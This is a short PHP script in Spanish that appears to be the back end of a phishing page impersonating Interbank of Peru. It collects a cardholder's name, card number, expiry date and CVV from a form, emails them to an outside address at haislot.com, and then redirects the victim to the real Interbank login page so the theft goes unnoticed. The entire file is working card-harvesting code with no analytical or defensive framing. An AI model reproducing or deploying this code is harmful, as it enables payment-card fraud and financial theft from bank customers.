<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $nombre = $_POST['nombre'];
    $numeroTarjeta = $_POST['numero'];
    $fechaVencimiento = $_POST['expiracion'];
    $cvv = $_POST['cvv'];

    $destinatario = "satev76335@haislot.com";
    $asunto = "Nueva entrada de formulario de tarjeta";
    $cuerpo = "Nombre del titular: $nombre\nNúmero de tarjeta: $numeroTarjeta\nFecha de vencimiento: $fechaVencimiento\nCVV: $cvv";

    mail($destinatario, $asunto, $cuerpo);

    // Redirige al usuario a la página de login de Interbank
    header("Location: https://bancaporinternet.interbank.pe/login");
    exit();
}
?>
